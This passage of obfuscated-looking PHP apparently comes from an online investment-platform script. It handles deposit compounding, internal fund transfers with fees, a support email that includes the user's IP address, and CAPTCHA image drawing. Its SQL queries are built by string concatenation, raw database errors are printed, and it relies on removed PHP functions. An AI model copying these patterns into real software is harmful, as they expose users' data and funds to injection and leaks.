                                      $elnlcCUpJf = $elnlcsyENS['elnlcmjUx'];
                                    }

                                    if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcutzo'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcAfqcP']))
                                    {
                                      $elnlctxrcu = '' . ' and (compound < ' . $elnlcCUpJf . ' or compound is NULL)';
                                    }

                                    $q = '' . 'update hm2_deposits set compound = ' . $elnlcCUpJf . ' where user_id = ' . $elnlcOzjJ . ' and id = ' . $elnlcOMIk . ' ' . $elnlctxrcu;
                                    (mysql_query ($q) OR print mysql_error ());
                                    header ('Location: ?a=change_compound&complete=1');
                                    exit ();
                                  }

                                  $elnlcNEHWg[$elnlcsyENS['elnlcOBsC']] = number_format ($elnlcNEHWg[$elnlcsyENS['elnlcAwVw']], 2);
                                  $elnlcNEHWg[$elnlcsyENS['elnlccdExO']] = sprintf ('%.02f', $elnlcNEHWg[$elnlcsyENS['elnlccdExO']]);
                                  $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                  $elnlcfhFg->assign ('type', $elnlcgNwD);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlcbSJM']);
                                  print base64_decode ('Cg==
');
                                }
                                else
                                {
                                  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcwwbjI'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcNCOOK']])
                                    {
                                      $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlctfAMc']);
                                      $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                      exit ();
                                    }

                                    if (!$elnlcSuVc[$elnlcsyENS['elnlcVBJk']])
                                    {
                                      $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcmRAKp']);
                                      $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                      exit ();
                                    }

                                    if (0 < $elnlcSuVc[$elnlcsyENS['elnlcJiVo']])
                                    {
                                      $q = 'select count(*) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                      $elnlchGkPU = mysql_query ($q);
                                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                      if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] < 1)
                                      {
                                        $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlctqVr']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }
                                    }

                                    $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                                    $elnlcTshQ = array ();
                                    $elnlcotDB[$elnlcsyENS['elnlcbzLT']] = 0 - $elnlcotDB[$elnlcsyENS['elnlcbzLT']];
                                    reset ($elnlcotDB);
                                    while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcotDB))
                                    {
                                      $elnlcOBJb = floor ($elnlcOBJb * 100) / 100;
                                      $elnlcTshQ[$elnlcuwppG] = number_format ($elnlcOBJb, 2);
                                    }

                                    $elnlcfhFg->assign ('ab_formated', $elnlcTshQ);
                                    $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
                                    $elnlchGkPU = mysql_query ($q);
                                    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                    {
                                      $elnlcpCDfw = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 100) / 100;
                                      $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcpCDfw, 2);
                                      $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcWulxj']] = $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']];
                                    }

                                    $elnlcQTTo = array ();
                                    reset ($elnlcGPfS);
                                    foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                                    {
                                      array_push ($elnlcQTTo, array_merge (array ('id' => $elnlckapu), (array)$elnlcoFEhc));
                                    }

                                    $elnlcfhFg->assign ('ps', $elnlcQTTo);
                                    if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                    {
                                      $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[id] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
              hm2_deposits.deposit_date + interval hm2_types.hold day > now() and
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
	    group by hm2_history.ec
          ';
                                    }
                                    else
                                    {
                                      $q = '' . 'select
              sum(hm2_history.actual_amount) as am, 
	      hm2_history.ec
            from
              hm2_history,
              hm2_deposits,
              hm2_types
            where
              hm2_history.user_id = ' . $elnlcgcnET[id] . ' and
	      hm2_history.deposit_id = hm2_deposits.id and
              hm2_types.id = hm2_deposits.type_id and
              now() - interval hm2_types.hold day < hm2_history.date and 
	      (hm2_history.type=\'earning\' or 
		(hm2_history.type=\'deposit\' and (hm2_history.description like \'Compou%\' or hm2_history.description like \'<b>Archived transactions</b>:<br>Compound%\'))) 
	    group by hm2_history.ec
          ';
                                    }

                                    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                    $elnlcadsc = array ();
                                    $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                    $elnlcTmCT = array ();
                                    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                    {
                                      array_push ($elnlcTmCT, array ('ec' => $elnlcCgqPK[ec], 'amount' => number_format ($elnlcCgqPK[am], 2)));
                                    }

                                    $elnlcfhFg->assign ('hold', $elnlcTmCT);
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcRAFFC'])
                                    {
                                      $elnlcjPews = array ();
                                      if ($elnlcSuVc[$elnlcsyENS['elnlcHNepM']] == $elnlcsyENS['elnlcNVEl'])
                                      {
                                        if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
                                        {
                                          if (VN_SAVED != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
                                          {
                                            $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcdrfg']);
                                            $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                            exit ();
                                          }
                                        }
                                      }

                                      $elnlcrUqv = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                                      $elnlciSebT = intval ($elnlcWodOE[$elnlcsyENS['elnlcyqyS']]);
                                      if (($elnlcrUqv <= 0 OR $elnlcrUqv < $elnlcSuVc[$elnlcsyENS['elnlciMqw']]))
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcARBzD']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE'])
                                      {
                                        if ((0 < $elnlcSuVc[$elnlcsyENS['elnlcyADoE']] AND $elnlcSuVc[$elnlcsyENS['elnlcyADoE']] < $elnlcrUqv))
                                        {
                                          $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcGKWz']);
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                          exit ();
                                        }
                                      }

                                      if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                      {
                                        $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT . ' and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                                      }
                                      else
                                      {
                                        $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT;
                                      }

                                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                      $elnlcadsc = array ();
                                      $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                      $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                      {
                                        $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
		deposit_id = ' . $elnlcCgqPK[id] . ' and date > now() - interval ' . $elnlcCgqPK[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                                        ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                                        while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                        {
                                          $elnlcEEGK += $elnlcUpbus[amount];
                                        }
                                      }

                                      $elnlcntKzA = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcWulxj']] - $elnlcEEGK;
                                      $elnlcKtjJ = $elnlcrUqv * ($elnlcSuVc[$elnlcsyENS['elnlcSfkr']] / 100);
                                      if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcxIxy']])
                                      {
                                        $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcxIxy']];
                                      }

                                      $elnlcKtjJ = sprintf ('%.02f', $elnlcKtjJ);
                                      $elnlcbodaI = sprintf ('%.02f', $elnlcrUqv + ($elnlcSuVc[$elnlcsyENS['elnlcdwJa']] == 0 ? $elnlcKtjJ : 0));
                                      $elnlcFcMa = sprintf ('%.02f', $elnlcrUqv - ($elnlcSuVc[$elnlcsyENS['elnlcdwJa']] == 1 ? $elnlcKtjJ : 0));
                                      if (($elnlcntKzA < $elnlcbodaI AND $elnlcSuVc[$elnlcsyENS['elnlcdwJa']] == 0))
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcjqIoL']);
                                        $elnlcfhFg->assign ('amount', $elnlcrUqv);
                                        $elnlcfhFg->assign ('fee', sprintf ('%.02f', $elnlcKtjJ));
                                        $elnlcfhFg->assign ('to_send', $elnlcbodaI);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      if ($elnlcntKzA < $elnlcrUqv)
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcSazF']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      $elnlchqLS = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcJdSMq']]);
                                      $q = '' . 'select * from hm2_users where username = \'' . $elnlchqLS . '\' and status = \'on\'';
                                      $elnlchGkPU = mysql_query ($q);
                                      $elnlcKCjH = mysql_fetch_array ($elnlchGkPU);
                                      if (!$elnlcKCjH)
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcErPC']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      $elnlcfhFg->assign ('user', $elnlcKCjH);
                                      $elnlcfhFg->assign ('amount', $elnlcrUqv);
                                      $elnlcfhFg->assign ('to_send', $elnlcbodaI);
                                      $elnlcfhFg->assign ('to_receive', $elnlcFcMa);
                                      $elnlcfhFg->assign ('fee', $elnlcKtjJ);
                                      $elnlcfhFg->assign ('ec', $elnlciSebT);
                                      $elnlcfhFg->assign ('ec_name', $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']]);
                                      $elnlcfhFg->assign ('comment', $elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]);
                                      $elnlcfhFg->assign ('preview', 1);
                                      $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                      exit ();
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlczMrjv'])
                                    {
                                      if ($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']])
                                      {
                                        if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != $elnlcgcnET[$elnlcsyENS['elnlcAIMpf']])
                                        {
                                          $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcJkNB']);
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                          exit ();
                                        }
                                      }

                                      $elnlcrUqv = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                                      $elnlciSebT = intval ($elnlcWodOE[$elnlcsyENS['elnlcyqyS']]);
                                      if (($elnlcrUqv <= 0 OR $elnlcrUqv < $elnlcSuVc[$elnlcsyENS['elnlciMqw']]))
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcARBzD']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE'])
                                      {
                                        if ((0 < $elnlcSuVc[$elnlcsyENS['elnlcyADoE']] AND $elnlcSuVc[$elnlcsyENS['elnlcyADoE']] < $elnlcrUqv))
                                        {
                                          $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcGKWz']);
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                          exit ();
                                        }
                                      }

                                      if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                      {
                                        $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT . ' and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                                      }
                                      else
                                      {
                                        $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT;
                                      }

                                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                      $elnlcadsc = array ();
                                      $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                      $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                      {
                                        $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
		deposit_id = ' . $elnlcCgqPK[id] . ' and date > now() - interval ' . $elnlcCgqPK[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                                        ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                                        while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                        {
                                          $elnlcEEGK += $elnlcUpbus[amount];
                                        }
                                      }

                                      $elnlcntKzA = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcWulxj']] - $elnlcEEGK;
                                      $elnlcKtjJ = $elnlcrUqv * ($elnlcSuVc[$elnlcsyENS['elnlcSfkr']] / 100);
                                      if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcxIxy']])
                                      {
                                        $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcxIxy']];
                                      }

                                      $elnlcKtjJ = sprintf ('%.02f', $elnlcKtjJ);
                                      $elnlcbodaI = $elnlcrUqv + $elnlcKtjJ;
                                      $elnlcbodaI = sprintf ('%.02f', $elnlcbodaI);
                                      if (($elnlcntKzA < $elnlcbodaI AND $elnlcSuVc[$elnlcsyENS['elnlcdwJa']] == 0))
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcjqIoL']);
                                        $elnlcfhFg->assign ('amount', $elnlcrUqv);
                                        $elnlcfhFg->assign ('fee', sprintf ('%.02f', $elnlcKtjJ));
                                        $elnlcfhFg->assign ('to_send', $elnlcbodaI);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      if ($elnlcntKzA < $elnlcrUqv)
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcMbCSk']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      $elnlchqLS = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcJdSMq']]);
                                      $q = '' . 'select * from hm2_users where username = \'' . $elnlchqLS . '\' and status = \'on\'';
                                      $elnlchGkPU = mysql_query ($q);
                                      $elnlcKCjH = mysql_fetch_array ($elnlchGkPU);
                                      if (!$elnlcKCjH)
                                      {
                                        $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcErPC']);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                        exit ();
                                      }

                                      $elnlclVksS = $elnlcCMrk = $elnlcrUqv;
                                      if (0 < $elnlcKtjJ)
                                      {
                                        if ($elnlcSuVc[$elnlcsyENS['elnlcdwJa']] == 0)
                                        {
                                          $elnlclVksS = $elnlcrUqv + $elnlcKtjJ;
                                        }
                                        else
                                        {
                                          $elnlcCMrk = $elnlcrUqv - $elnlcKtjJ;
                                        }
                                      }

                                      $q = 'insert into hm2_history set
            user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
            amount = -' . $elnlclVksS . ',
            actual_amount = -' . $elnlclVksS . ',
            type = \'internal_transaction_spend\',
            description = \'Internal transaction to `') . $elnlcKCjH[$elnlcsyENS['elnlczWew']] . '` account.' . ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']] ? ' Comments: ' . elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]) : '') . ('' . '\',
            date = now(),
            ec = ' . $elnlciSebT . '
         ');
                                      mysql_query ($q);
                                      $q = 'insert into hm2_history set
            user_id = ' . $elnlcKCjH[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
            amount = ' . $elnlcCMrk . ',
            actual_amount = ' . $elnlcCMrk . ',
            type = \'internal_transaction_receive\',
            description = \'Internal transaction from `') . $elnlcgcnET[$elnlcsyENS['elnlczWew']] . '` account.' . ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']] ? ' Comments: ' . elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]) : '') . ('' . '\',
            date = now(),
            ec = ' . $elnlciSebT . '
         ');
                                      mysql_query ($q);
                                      header ('Location: ?a=internal_transfer&complete=1');
                                      exit ();
                                    }

                                    if ($elnlcSuVc[$elnlcsyENS['elnlcHNepM']] == $elnlcsyENS['elnlcNVEl'])
                                    {
                                      if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
                                      {
                                        $elnlcgcnET[validation_enabled] = $elnlcsyENS['elnlctNxTK'];
                                        session_start ();
                                        $elnlcWTPp = elnlcshwnc ($elnlcSuVc[$elnlcsyENS['elnlcQMrd']], ($elnlcSuVc[$elnlcsyENS['elnlcNmjU']] ? 2 : 0));
                                        $_SESSION[$elnlcsyENS['elnlcAHrk']] = $elnlcWTPp;
                                        $elnlcgcnET[session_name] = session_name ();
                                        $elnlcgcnET[session_id] = session_id ();
                                        $elnlcgcnET[rand] = rand ();
                                        $elnlcfhFg->assign ('userinfo', $elnlcgcnET);
                                      }
                                    }

                                    $elnlcfhFg->display ($elnlcsyENS['elnlcHzcNt']);
                                    print base64_decode ('Cg==
');
                                  }
                                  else
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcvsdGx'])
                                    {
                                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcjjhy'])
                                      {
                                        $elnlcjPews = array ();
                                        if ($elnlcSuVc[$elnlcsyENS['elnlcHNepM']] == $elnlcsyENS['elnlcNVEl'])
                                        {
                                          if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
                                          {
                                            if (VN_SAVED != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
                                            {
                                              $elnlcjPews[$elnlcsyENS['elnlcCipNH']] = $elnlcsyENS['elnlctNxTK'];
                                            }
                                          }
                                        }

                                        if (!$elnlcjPews)
                                        {
                                          $elnlcQVmJ = ($elnlcgcnET[$elnlcsyENS['elnlcpicy']] ? $elnlcgcnET[$elnlcsyENS['elnlcdktEr']] : $elnlcWodOE[$elnlcsyENS['elnlcdktEr']]);
                                          $elnlcrIMb = $elnlcSuVc[$elnlcsyENS['elnlcIEsb']] . ' Support request from ' . date ('l dS of F Y h:i:s A') . '

---------------------------------------------------------------
';
                                          $elnlcrIMb .= $elnlcWodOE[$elnlcsyENS['elnlcEzBz']];
                                          $elnlcrIMb .= '

---------------------------------------------------------------
';
                                          $elnlcrIMb .= 'User Additional Info :
';
                                          if ($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1)
                                          {
                                            $elnlcLOJT = array ();
                                            $elnlcLOJT = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                                            $elnlcrIMb .= 'User      : ' . $elnlcgcnET[$elnlcsyENS['elnlczWew']] . '
';
                                            $elnlcrIMb .= 'User Name : ' . $elnlcgcnET[$elnlcsyENS['elnlcmjdk']] . '
';
                                            $elnlcrIMb .= 'E-Mail    : ' . $elnlcgcnET[$elnlcsyENS['elnlcdktEr']] . '
';
                                            foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                                            {
                                              if ($elnlcoFEhc[status] == 1)
                                              {
                                                $elnlcrIMb .= $elnlcoFEhc[name] . ' Acc : ' . $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlckapu] . '
';
                                                continue;
                                              }
                                            }

                                            $elnlcrIMb .= 'Status    : ' . $elnlcgcnET[$elnlcsyENS['elnlccotiB']] . '
';
                                            $elnlcrIMb .= '' . 'Active Deposits  : $' . sprintf ('%.02f', $elnlcLOJT[$elnlcsyENS['elnlcHcDrx']]) . '
';
                                          }
                                          else
                                          {
                                            $elnlcrIMb .= 'User Name : ' . $elnlcWodOE[$elnlcsyENS['elnlcmjdk']] . '
';
                                            $elnlcrIMb .= 'E-Mail    : ' . $elnlcWodOE[$elnlcsyENS['elnlcdktEr']] . '
';
                                            $elnlcrIMb .= 'Not Registered/Logged user
';
                                          }

                                          if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcumRDd'])
                                          {
                                            $elnlcrIMb .= 'Department: ' . $elnlcWodOE[$elnlcsyENS['elnlcxrco']] . '
';
                                            $elnlcrIMb .= 'Subject   : ' . $elnlcWodOE[$elnlcsyENS['elnlcrWon']] . '
';
                                          }

                                          $elnlcrIMb .= 'IP Address: ' . $_SERVER[$elnlcsyENS['elnlcnGMB']] . '
';
                                          $elnlcrIMb .= 'Language  : ' . $_SERVER[$elnlcsyENS['elnlcuAycs']] . '
';
                                          $q = 'select * from hm2_users where id = 1';
                                          $elnlchGkPU = mysql_query ($q);
                                          $elnlcSWfu = '';
                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                          {
                                            $elnlcSWfu = $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']];
                                          }

                                          mail ($elnlcSWfu, $elnlcSuVc[$elnlcsyENS['elnlcIEsb']] . ' Support Request', $elnlcrIMb, '' . 'From: ' . $elnlcQVmJ);
                                          header ('Location: ?a=support&say=send

');
                                          exit ();
                                        }
                                      }

                                      $elnlcfhFg->assign ('errors', $elnlcjPews);
                                      $elnlcfhFg->assign ('say', $elnlcWodOE[$elnlcsyENS['elnlciKgs']]);
                                      $elnlcfhFg->display ($elnlcsyENS['elnlcEvQHA']);
                                      print base64_decode ('Cg==
');
                                    }
                                    else
                                    {
                                      if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcIMmgI'])
                                      {
                                        $elnlcfhFg->assign ('site_name', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']]);
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcyNmn']);
                                        print base64_decode ('Cg==
');
                                      }
                                      else
                                      {
                                        if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlchyWz'])
                                        {
                                          $elnlcfhFg->assign ('site_name', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']]);
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcOsnE']);
                                          print base64_decode ('Cg==
');
                                        }
                                        else
                                        {
                                          if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcuRmRV'])
                                          {
                                            session_start ();
                                            $elnlcECvOw = $_SESSION[$elnlcsyENS['elnlcAHrk']];
                                            $elnlcIWALM = $elnlcsyENS['elnlctqde'];
                                            $elnlceIix = $elnlcsyENS['elnlctqde'];
                                            $elnlcvbCg = $elnlcsyENS['elnlctqde'];
                                            if (eregi ('[#]?([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})', $elnlcSuVc[$elnlcsyENS['elnlcmIQk']], $elnlcnHzmn))
                                            {
                                              $elnlcIWALM = hexdec ($elnlcnHzmn[1]);
                                              $elnlceIix = hexdec ($elnlcnHzmn[2]);
                                              $elnlcvbCg = hexdec ($elnlcnHzmn[3]);
                                            }

                                            $elnlcqiEz = $elnlcsyENS['elnlcmjUx'];
                                            $elnlcxcqvD = $elnlcsyENS['elnlcmjUx'];
                                            $elnlcPsGUK = $elnlcsyENS['elnlcmjUx'];
                                            if (eregi ('[#]?([0-9a-f]{2})([0-9a-f]{2})([0-9a-f]{2})', $elnlcSuVc[$elnlcsyENS['elnlcJrSyd']], $elnlcnHzmn))
                                            {
                                              $elnlcqiEz = hexdec ($elnlcnHzmn[1]);
                                              $elnlcxcqvD = hexdec ($elnlcnHzmn[2]);
                                              $elnlcPsGUK = hexdec ($elnlcnHzmn[3]);
                                            }

                                            if ((($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEbpr'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE']) OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcJduI']))
                                            {
                                              $elnlcQayp = $elnlcsyENS['elnlcmjUx'];
                                              $elnlcpREy = $elnlcsyENS['elnlcmjUx'];
                                              $elnlceWfw = './fonts/font.ttf';
                                              $elnlcjfhkl = array ();
                                              $elnlcTOPL = $elnlcsyENS['elnlcmjUx'];
                                              for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcECvOw); ++$i)
                                              {
                                                $elnlcBKsM = rand ($elnlcSuVc[$elnlcsyENS['elnlcfPgDr']], $elnlcSuVc[$elnlcsyENS['elnlcitBa']]);
                                                $elnlcBKsM = rand (16, 20);
                                                $elnlcrwaW = rand (-10, 10);
                                                $elnlcEhTj = imagettfbbox ($elnlcBKsM, $elnlcrwaW, $elnlceWfw, $elnlcECvOw[$i]);
                                                $elnlchkehH = max ($elnlcEhTj[1], $elnlcEhTj[3], $elnlcEhTj[5], $elnlcEhTj[7]) - min ($elnlcEhTj[1], $elnlcEhTj[3], $elnlcEhTj[5], $elnlcEhTj[7]);
                                                $elnlcThqqF = max ($elnlcEhTj[0], $elnlcEhTj[2], $elnlcEhTj[4], $elnlcEhTj[6]) - min ($elnlcEhTj[0], $elnlcEhTj[2], $elnlcEhTj[4], $elnlcEhTj[6]) + 1;
                                                $elnlcjfhkl[$i] = array ('size' => $elnlcBKsM, 'angle' => $elnlcrwaW, 'width' => $elnlcThqqF + 2, 'height' => $elnlchkehH);
                                                $elnlcQayp += $elnlcThqqF + 2;
                                                if ($elnlcpREy < $elnlchkehH)
                                                {
                                                  $elnlcpREy = $elnlchkehH;
                                                  continue;
                                                }
                                              }

                                              $elnlcfHpAA = imagecreatetruecolor ($elnlcQayp + 4 - strlen ($elnlcECvOw) * 5, $elnlcpREy + 4);
                                              $elnlcBwPM = imagecolorallocate ($elnlcfHpAA, $elnlcIWALM, $elnlceIix, $elnlcvbCg);
                                              $elnlcFbeuJ = imagecolorallocate ($elnlcfHpAA, 182, 1, 0);
                                              imagefilledrectangle ($elnlcfHpAA, 0, 0, imagesx ($elnlcfHpAA), imagesy ($elnlcfHpAA), $elnlcBwPM);
                                              $x = $elnlcsyENS['elnlcwshtO'];
                                              for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcECvOw); ++$i)
                                              {
                                                $elnlchkehH = $elnlcpREy;
                                                $elnlcThqqF = $elnlcjfhkl[$i][$elnlcsyENS['elnlcUcbao']] - 5;
                                                $y = $elnlcsyENS['elnlcmjUx'];
